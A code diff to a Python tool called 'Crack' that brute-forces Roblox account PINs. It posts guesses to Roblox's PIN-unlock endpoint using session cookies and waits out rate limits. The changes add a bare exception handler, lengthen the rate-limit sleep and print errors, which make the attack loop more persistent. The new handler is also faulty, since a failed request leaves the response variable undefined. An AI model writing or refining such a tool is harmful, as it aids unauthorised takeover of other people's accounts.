@@ -193,8 +193,10 @@ class Crack:
             printed = False
 
             while True:
-
-                request = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies)
+                try:
+                    request = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies)
+                except:
+                    pass
                 response = request.json()
                 status_code = request.status_code
 
@@ -224,7 +226,7 @@ class Crack:
                                 uiprint(f'Too many requests. Waiting 20 minutes before resumimg', 'ratelimit')
                                 printed = True
 
-                            time.sleep(1)
+                            time.sleep(60)
                             continue
 
                         if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
@@ -252,4 +254,5 @@ if __name__ == "__main__":
     try:
         Crack()
     except Exception as e:
+        print(e)
         Crack.diagnose(e)
